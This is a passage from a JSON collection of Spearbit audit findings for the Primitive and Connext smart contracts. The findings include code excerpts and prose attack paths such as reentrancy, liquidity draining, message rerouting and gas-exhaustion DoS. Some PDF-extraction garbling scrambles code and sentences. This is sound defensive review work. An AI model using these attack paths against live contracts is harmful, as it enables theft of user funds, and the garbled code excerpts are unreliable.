tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; 12 = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getMaxOrder overestimates output values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The getMaxOrder function adds + 1 to the output value, overestimating the output value. This can lead to failed swaps if this value is used. tempOutput = pool.virtualY - lowerY.mulWadDown(pool.liquidity) + 1; also easy It's erY.mulWadDown(pool.liquidity) + 1 = pool.virtualY + 1, more than the pool reserves. that with lowerY = 0 we see to have i.e., tempOutput = pool.virtualY - low- the max out amount would be",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Improve reentrancy guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "Previously, only settlement performed calls to arbitrary addresses through ERC20 transfers. With recent additions, like the ERC1155._mint and user-provided strategies, single actions like allocate and swap also perform calls to potentially malicious contracts. This increases the attack surface for reentrancy attacks. The current way of protecting against reentrancy works by setting multicall flags (_currentMulticall) and locks (preLock() and postLock()) on multicalls and single-action calls. However, the single calls essentially skip reen- trancy guards if the outer context is a multicall. This still allows for reentrancy through control flows like the following: // reenter during multicall's action execution multicall preLock() singleCall() reenter during current execution singeCall() preLock(): passes because we're in multicall skips settlement postLock(): passes because we're in multicall _currentMulticall = false; settlement() postLock() // reenter during multicall's settlement multicall preLock() singleCall preLock(): ... postLock(): `_locked = 1` _currentMulticall = false; settlement() reenter singeCall() passes preLock because not locked mutliCall() passes multicall reentrancy guard because not in multicall passes preLock because not locked ... settlement finishes postLock()",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "approximatePriceGivenX does not need to compute y-bounds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The approximatePriceGivenX function does not need to compute the y-bounds by calling self.getReserveYBounds().",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary computations in NormalStrategy.beforeSwap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The NormalStrategy.sol.beforeSwap function calls getSwapInvariants to simulate an entire swap with current and post-swap invariants. However, only the current invariant value is used.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pools can use malicious strategies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "Anyone can create pools and configure the pool to use a custom strategy. A malicious strategy can disable swapping and (de-)allocating at any time, as well as enable privileged parties to trade out all pool reserves by implementing custom logic in the validateSwap function.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "findRootForSwappingIn functions should use MINIMUM_INVARIANT_DELTA",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The findRootForSwappingInX and findRootForSwappingInY functions add + 1 to the previous curve invariant tradingFunction(curve) - (curve.invariant + 1)",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The NormalStrategyLib_UpperPriceLimitReached and NormalStrategyLib_LowerPriceLim- itReached errors are not used.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "getSwapInvariants order output can be 1 instead of 2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The getSwapInvariants function is used to simulate swaps for the getAmountOut and beforeSwap functions. These functions use an artificial output value of 2 such that the function does not revert.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AfterCreate event uses wrong durationSeconds value if pool is perpetual",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The AfterCreate uses the cached config.durationSeconds value but the real value the config storage struct is initialized with will be SECONDS_PER_YEAR in the case of perpetual pools.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary fee reserves check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The fee amount is always taken on the input and the fee percentage is always less than 100%. Therefore, the fee is always less than the input. The following check should never fail adjustedInputReserveWad += self.input; // feeAmountUnit <= self.input <= adjustedInputReserveWad if (feeAmountUnit > adjustedInputReserveWad) revert SwapLib_FeeTooHigh();",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "swapInternal() shouldn't use msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "As reported by the Connext team, the internal stable swap checks if msg.sender has sufficient funds on execute(). This msg.sender is the relayer which normally wouldn't have these funds so the swaps would fail. The local funds should come from the Connext diamond itself. BridgeFacet.sol function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { ... (uint256 amountOut, address asset, address local) = _handleExecuteLiquidity(...); ... } function _handleExecuteLiquidity(...) ... { ... (uint256 amount, address adopted) = AssetLogic.swapFromLocalAssetIfNeeded(...); ... } AssetLogic.sol function swapFromLocalAssetIfNeeded(...) ... { ... return _swapAsset(...); } function _swapAsset(... ) ... { ... SwapUtils.Swap storage ipool = s.swapStorages[_key]; if (ipool.exists()) { // Swap via the internal pool. return ... ipool.swapInternal(...) ... } } SwapUtils.sol function swapInternal(...) ... { IERC20 tokenFrom = self.pooledTokens[tokenIndexFrom]; require(dx <= tokenFrom.balanceOf(msg.sender), \"more than you own\"); ... } // msg.sender is the relayer",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "MERKLE.insert does not return the updated tree leaf count",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The NatSpec comment for insert is * @return uint256 Updated count (number of nodes in the tree). But that is not true. If the updated count is 2k (2n + 1) where k , n 2 N [ 0 then the return value would be 2n + 1. Currently, the returned value of insert is not being used, otherwise, this could be a bigger issue.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "PolygonSpokeConnector or PolygonHubConnector can get compromised and DoSed if an address(0) is passed to their constructor for _mirrorConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "PolygonSpokeConnector (PolygonHubConnector) inherits from SpokeConnector (HubConnector) and FxBaseChildTunnel (FxBaseRootTunnel). When PolygonSpokeConnector (PolygonHubConnector) gets de- ployed and its constructor is called, if _mirrorConnector == address(0) then setting the mirrorConnector stor- age variable is skipped: // File: Connector.sol#L118-L121 if (_mirrorConnector != address(0)) { _setMirrorConnector(_mirrorConnector); } Now since the setFxRootTunnel (setFxChildTunnel) is an unprotected endpoint that is not overridden by it and assign their own fxRootTunnel PolygonSpokeConnector (PolygonHubConnector) anyone can call (fxChildTunnel) address (note, fxRootTunnel (fxChildTunnel) is supposed to correspond to mirrorConnector on the destination domain). the require statement in setFxRootTunnel (setFxChildTunnel) only allows fxRootTunnel Note that (fxChildTunnel) to be set once (non-zero address value) so afterward even the owner cannot update this value. If at some later time the owner tries to call setMirrorConnector to assign the mirrorConnector, since _setMir- rorConnector is overridden by PolygonSpokeConnector (PolygonHubConnector) the following will try to execute: 9 // File: PolygonSpokeConnector.sol#L78-L82 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxRootTunnel(_mirrorConnector); } Or for PolygonHubConnector: // File: PolygonHubConnector.sol#L51-L55 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } But this will revert since fxRootTunnel (fxChildTunnel) is already set. Thus if the owner of PolygonSpokeConnec- tor (PolygonHubConnector) does not provide a non-zero address value for mirrorConnector upon deployment, a malicious actor can set fxRootTunnel which will cause: 1. Rerouting of messages from Polygon to Ethereum to an address decided by the malicious actor (or vice versa for PolygonHubConnector). 2. DoSing the setMirrorConnector and setFxRootTunnel (fxChildTunnel) endpoints for the owner. PolygonSpokeConnector's",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "A malicious owner or user with a Role.Router role can drain a router's liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A malicious owner or user with Role.Router Role denominated as A in this example, can drain a router's liquidity for a current router (a router that has already been added to the system and might potentially have added big liquidities to some assets). Here is how A can do it (can also be done atomically): 1. Remove the router by calling removeRouter. 2. Add the router back by calling setupRouter and set the owner and recipient parameters to accounts A has access to / control over. 3. Loop over all tokens that the router has liquidity and call removeRouterLiquidityFor to drain/redirect the funds into accounts A has control over. That means all routers would need to put their trust in the owner (of this connext instance) and any user who has a Role.Router Role with their liquidity. So the setup is not trustless currently.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Users are forced to accept any slippage on the destination chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The documentation mentioned that there is cancel function on the destination domain that allows users to send the funds back to the origin domain, accepting the loss incurred by slippage from the origin pool. However, this feature is not found in the current codebase. If the high slippage rate persists continuously on the destination domain, the users will be forced to accept the high slippage rate. Otherwise, their funds will be stuck in Connext.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Preservation of msg.sender in ZkSync could break certain trust assumption",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For ZkSync chain, the msg.sender is preserved for L1 -> L2 calls. One of the rules when pursuing a cross-chain strategy is to never assume that address control between L1 and L2 is always guaranteed. For EOAs (i.e., non-contract accounts), this is generally true that any account that can be accessed on Ethereum will also be accessible on other EVM-based chains. However, this is not always true for contract-based accounts as the same account/wallet address might be owned by different persons on different chains. This might happen if there is a poorly implemented smart contract wallet factory on multiple EVM-based chains that deterministically deploys a wallet based on some user-defined inputs. For instance, if a smart contract wallet factory deployed on both EVM-based chains uses deterministic CREATE2 which allows users to define its salt when deploying the wallet, Bob might use ABC as salt in Ethereum and Alice might use ABC as salt in Zksync. Both of them will end up getting the same wallet address on two different chains. A similar issue occurred in the Optimism-Wintermute Hack, but the actual incident is more complicated. Assume that 0xABC is a smart contract wallet owned and deployed by Alice on ZkSync chain. Alice performs a xcall from Ethereum to ZkSync with delegate set to 0xABC address. Thus, on the destination chain (ZkSync), only Alice's smart contract wallet 0xABC is authorized to call functions protected by the onlyDelegate modifier. 11 Bob (attacker) saw that the 0xABC address is not owned by anyone on Ethereum. Therefore, he proceeds to take ownership of the 0xABC by interacting with the wallet factory to deploy a smart contract wallet on the same address on Ethereum. Bob can do so by checking out the inputs that Alice used to create the wallet previously. Thus, Bob can technically make a request from L1 -> L2 to impersonate Alice's wallet (0xABC) and bypass the onlyDelegate modifier on ZkSync. Additionally, Bob could make a L1 -> L2 request by calling the ZKSync's BridgeFacet.xcall directly to steal Alice's approved funds. Since the xcall relies on msg.sender, it will assume that the caller is Alice. This issue is only specific to ZkSync chain due to the preservation of msg.sender for L1 -> L2 calls. For the other chains, the msg.sender is not preserved for L1 -> L2 calls and will always point to the L2's AMB forwarding the requests.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No way to update a Stable Swap once assigned to a key",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a Stable Swap is assigned to a key (the hash of the canonical id and domain for token), it cannot be updated nor deleted. A Swap can be hacked or an improved version may be released which will warrant updating the Swap for a key.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Renouncing ownership or admin role could affect the normal operation of Connext",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Instance 1 - Renouncing ownership All the contracts that extend from ProposedOwnable or ProposedOwnableUpgradeable inherit a method called renounceOwnership. The owner of the contract can use this method to give up their ownership, thereby leaving the contract without an owner. If that were to happen, it would not be possible to perform any owner-specific functionality on that contract anymore. The following is a summary of the affected contracts and their impact if the ownership has been renounced. 12 One of the most significant impacts is that Connext's message system cannot recover after a fraud has been resolved since there is no way to unpause and add the connector back to the system.  Instance 2 - Renouncing admin role All the contracts that extend from ProposedOwnableFacet inherit a method called revokeRole. 1. Assume that the Owner has renounced its power and the only Admin remaining used revokeRole to re- nounce its Admin role. 2. Now the contract is left with Zero Owner & Admin. 3. All swap operations collect adminFees via SwapUtils.sol contract. In absence of any Admin & Owner, these fees will get stuck in the contract with no way to retrieve them. Normally it would have been withdrawn using withdrawSwapAdminFees|SwapAdminFacet.sol. 4. This is simply one example, there are multiple other critical functionalities impacted once both Admin and Owner revoke their roles.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No way of removing Fraudulent Roots",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Fraudulent Roots cannot be removed once fraud is detected by the Watcher. This means that Fraud Roots will be propogated to each chain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Large number of inbound roots can DOS the RootManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It is possible to perform a DOS against the RootManager by exploiting the dequeueVerified function or insert function of the RootManager.sol. The following describes the possible attack path: 1. Assume that a malicious user calls the permissionless GnosisSpokeConnector.send function 1000 times (or any number of times that will cause an Out-of-Gas error later) within a single transaction/block on Gnosis causing a large number of Gnosis's outboundRoots to be forwarded to GnosisHubConnector on Ethereum. 2. Since the 1000 outboundRoots were sent at the same transaction/block earlier, all of them should arrive at the GnosisHubConnector within the same block/transaction on Ethereum. 13 3. For each of the 1000 outboundRoots received, the GnosisHubConnector.processMessage function will be triggered to process it, which will in turn call the RootManager.aggregate function to add the received out- boundRoot into the pendingInboundRoots queue. As a result, 1000 outboundRoots with the same commit- Block will be added to the pendingInboundRoots queue. 4. After the delay period, the RootManager.propagate function will be triggered. The function will call the dequeueVerified function to dequeue 1000 verified outboundRoots from the pendingInboundRoots queue by looping through the queue. This might result in an Out-of-Gas error and cause a revert. 5. If the above dequeueVerified function does not revert, the RootManager.propagate function will attempt to insert 1000 verified outboundRoots to the aggregated Merkle tree, which might also result in an Out-of-Gas error and cause a revert. If the RootManager.propagate function reverts when called, the latest aggregated Merkle root cannot be forwarded to the spokes. As a result, none of the messages can be proven and processed on the destination chains. Note: the processing on the Hub (which is on mainnet) can also become very expensive, as the mainnet usually as a far higher gas cost than the Spoke.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing mirrorConnector check on Optimism hub connector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "processMessageFromRoot() calls _processMessage() to process messages for the \"fast\" path. But _processMessage() can also be called by the AMB in the slow path. The second call to _processMessage() is not necessary (and could double process the message, which luckily is prevented via the processed[] mapping). The second call (from the AMB directly to _processMessage()) also doesn't properly verify the origin of the message, which might allow the insertion of fraudulent messages. 14 function processMessageFromRoot(...) ... { ... _processMessage(abi.encode(_data)); ... } function _processMessage(bytes memory _data) internal override { // sanity check root length require(_data.length == 32, \"!length\"); // get root from data bytes32 root = bytes32(_data); if (!processed[root]) { // set root to processed processed[root] = true; // update the root on the root manager IRootManager(ROOT_MANAGER).aggregate(MIRROR_DOMAIN, root); } // otherwise root was already sent to root manager }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Add _mirrorConnector to _sendMessage of BaseMultichain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _sendMessage() of BaseMultichain sends the message to the address of the _amb. This doesn't seem right as the first parameter is the target contract to interact with according to multichain cross- chain. This should probably be the _mirrorConnector. function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable ... ); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Unauthorized access to change acceptanceDelay",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The acceptanceDelay along with supportedInterfaces[] can be set by any user without the need of any Authorization once the init function of DiamondInit has been called and set. This is happening since caller checks (LibDiamond.enforceIsContractOwner();) are missing for these fields. Since acceptanceDelay defines the time post which certain action could be executed, setting a very large value could DOS the system (new owner cannot be set) and setting very low value could make changes without consid- eration time (Setting/Renounce Admin, Disable whitelisting etc at ProposedOwnableFacet.sol )",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Messages destined for ZkSync cannot be processed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For ZkSync chain, L2 to L1 communication is free, but L1 to L2 communication requires a certain amount of ETH to be supplied to cover the base cost of the transaction (including the _l2Value) + layer 2 operator tip. The _sendMessage function of ZkSyncHubConnector.sol relies on the IZkSync(AMB).requestL2Transaction function to send messages from L1 to L2. However, the requestL2Transaction call will always fail because no ETH is supplied to the transaction (msg.value is zero). As a result, the ZkSync's hub connector on Ethereum cannot forward the latest aggregated Merkle root to the ZkSync's spoke connector on ZkSync chain. Thus, any message destined for ZkSync chain cannot be processed since incoming messages cannot be proven without the latest aggregated Merkle root. 16 function _sendMessage(bytes memory _data) internal override { // Should always be dispatching the aggregate root require(_data.length == 32, \"!length\"); // Get the calldata bytes memory _calldata = abi.encodeWithSelector(Connector.processMessage.selector, _data); // Dispatch message // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#structure](https://v2-docs.zksync.io/d ,! ev/developer-guides/Bridging/l1-l2.html#structure) // calling L2 smart contract from L1 Example contract // note: msg.value must be passed in and can be retrieved from the AMB view function ,! `l2TransactionBaseCost` c // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in-your-proje ct](https://v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in- your-project) c c ,! ,! IZkSync(AMB).requestL2Transaction{value: msg.value}( // The address of the L2 contract to call mirrorConnector, // We pass no ETH with the call 0, // Encoding the calldata for the execute _calldata, // Ergs limit 10000, // factory dependencies new bytes[]0 ); } Additionally, the ZkSync's hub connector contract needs to be loaded with ETH so that it can forward the appro- priate amount of ETH when calling the ZkSync's requestL2Transaction. However, it is not possible to do so because no receive(), fallback or payable function has been implemented within the contract and its parent contracts for accepting ETH.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Cross-chain messaging via Multichain protocol will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Multichain v6 is supported by Connext for cross-chain messaging. The _sendMessage function of BaseMultichain.sol relies on Multichain's anyCall for cross-chain messaging. Per the Anycall V6 documentation, a gas fee for transaction execution needs to be paid either on the source or destination chain when an anyCall is called. However, the anyCall is called without consideration of the gas fee within the connectors, and thus the anyCall will always fail. Since Multichain's hub and spoke connectors are unable to send messages, cross-chain messaging using Multichain within Connext will not work. 17 function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable _data, address(0), // fallback address on origin chain MIRROR_CHAIN_ID, 0 // fee paid on origin chain ); } Additionally, for the payment of the execution gas fee, a project can choose to implement either of the following methods:  Pay on the source chain by depositing the gas fee to the caller contracts.  Pay on the destination chain by depositing the gas fee to Multichain's anyCall contract at the destination chain. If Connext decides to pay the gas fee on the source chain, they would need to deposit some ETH to the connector contracts. However, it is not possible because no receive(), fallback or payable function has been implemented within the contracts and their parent contracts for accepting ETH.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_domainSeparatorV4() not updated after name/symbol change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The BridgeToken allows updating the name and symbol of a token. However the _CACHED_DOMAIN_- SEPARATOR (of EIP712) isn't updated. This means that permit(), which uses _hashTypedDataV4() and _CACHED_- DOMAIN_SEPARATOR, still uses the old value. On the other hand DOMAIN_SEPARATOR() is updated. Both and especially their combination can give unexpected results. BridgeToken.sol function setDetails(string calldata _newName, string calldata _newSymbol) external override onlyOwner { // careful with naming convention change here token.name = _newName; token.symbol = _newSymbol; emit UpdateDetails(_newName, _newSymbol); } OZERC20.sol 18 function DOMAIN_SEPARATOR() external view override returns (bytes32) { // See {EIP712._buildDomainSeparator} return keccak256( abi.encode(_TYPE_HASH, keccak256(abi.encode(token.name)), _HASHED_VERSION, block.chainid, ,! address(this)) ); } function permit(...) ... { ... bytes32 _hash = _hashTypedDataV4(_structHash); ... } draft-EIP712.sol import \"./EIP712.sol\"; EIP712.sol function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) { return ECDSA.toTypedDataHash(_domainSeparatorV4(), structHash); } function _domainSeparatorV4() internal view returns (bytes32) { if (address(this) == _CACHED_THIS && block.chainid == _CACHED_CHAIN_ID) { return _CACHED_DOMAIN_SEPARATOR; } else { return _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "diamondCut() allows re-execution of old updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once diamondCut() is executed, ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _- init, _calldata))] is not reset to zero. This means the contract owner can rerun the old updates again without any delay by executing diamondCut() function. Assume the following: diamondCut() function is executed to update the facet selector with version_2 A bug is found in ver- sion_2 and it is rolled back Owner can still execute diamondCut() function which will again update the facet selector to version 2 since ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))] is still valid",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User may not be able to override slippage on destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If BridgeFacet.execute() is executed before BridgeFacet.forceUpdateSlippage(), user won't be able to update slippage on the destination chain. In this case, the slippage specified on the source chain is used. Due to different conditions on these chains, a user may want to specify different slippage values. This can result in user loss, as a slippage higher than necessary will result the swap trade being sandwiched.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Do not rely on token balance to determine when cap is reached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Connext Diamond defines a cap on each token. Any transfer making the total token balance more than the cap is reverted. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } Anyone can send tokens to Connext Diamond to artificially increase the custodied amount since it depends on the token balance. This can be an expensive attack but it can become viable if price of a token (including next assets) drops.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Router recipient can be configured more than once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comments from the setRouterRecipient function mentioned that the router should only be able to set the recipient once. Otherwise, no problem is solved. However, based on the current implementation, it is possible for the router to set its recipient more than once. /** File: RoutersFacet.sol 394: 395: 396: 397: 398: 399: 400: 401: * @notice Sets the designated recipient for a router * @dev Router should only be able to set this once otherwise if router key compromised, * no problem is solved since attacker could just update recipient * @param router Router address to set recipient * @param recipient Recipient Address to set to router */ function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { Let's assume that during router setup, the setupRouter function is being called and the owner is set to Alice's first EOA (0x123), and the recipient is set to Alice's second EOA (0x456). Although the comment mentioned that the setRouterRecipient should only be set once, this is not true because this function will only revert if the _- prevRecipient == recipient. As long as the new recipient is not the same as the previous recipient, the function will happily accept the new recipient. Therefore, if the router's signing key is compromised by Bob (attacker), he could call the setRouterRecipient function to change the new recipient to his personal EOA and drain the funds within the router. The setRouterRecipient function is protected by onlyRouterOwner modifier. Since Bob's has the compromised router's signing key, he will be able to pass this validation check. 21 /** File: RoutersFacet.sol 157: 158: 159: 160: 161: 162: 163: 164: 165: _; } * @notice Asserts caller is the router owner (if set) or the router itself */ modifier onlyRouterOwner(address _router) { address owner = s.routerPermissionInfo.routerOwners[_router]; if (!((owner == address(0) && msg.sender == _router) || owner == msg.sender)) revert RoutersFacet__onlyRouterOwner_notRouterOwner(); The second validation is at Line 404, which checks if the new recipient is not the same as the previous recipient. The recipient variable is set to Bob's EOA wallet, while _prevRecipient variable is set to Alice's second EOA (0x456). Therefore, the condition at Line 404 is False, and it will not revert. So Bob successfully set the recipient to his EOA at Line 407. File: RoutersFacet.sol 401: 402: 403: 404: 405: 406: 407: function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { // Check recipient is changing address _prevRecipient = s.routerPermissionInfo.routerRecipients[router]; if (_prevRecipient == recipient) revert RoutersFacet__setRouterRecipient_notNewRecipient(); // Set new recipient s.routerPermissionInfo.routerRecipients[router] = recipient; Per the Github discussion, the motivation for such a design is the following: If a routers signing key is compromised, the attacker could drain the liquidity stored on the contract and send it to any specified address. This effectively means the key is in control of all unused liquidity on chain, which prevents router operators from adding large amounts of liquidity directly to the contract. Routers should be able to delegate the safe withdrawal address of any unused liquidity, creating a separation of concerns between router key and liquidity safety. In summary, the team is trying to create a separation of concerns between router key and liquidity safety. With the current implementation, there is no security benefit of segregating the router owner role and recipient role unless the router owner has been burned (e.g. set to address zero). Because once the router's signing key is compromised, the attacker can change the recipient anyway. The security benefits of separation of concerns will only be achieved if the recipient can truly be set only once.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The set of tokens in an internal swap pool cannot be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
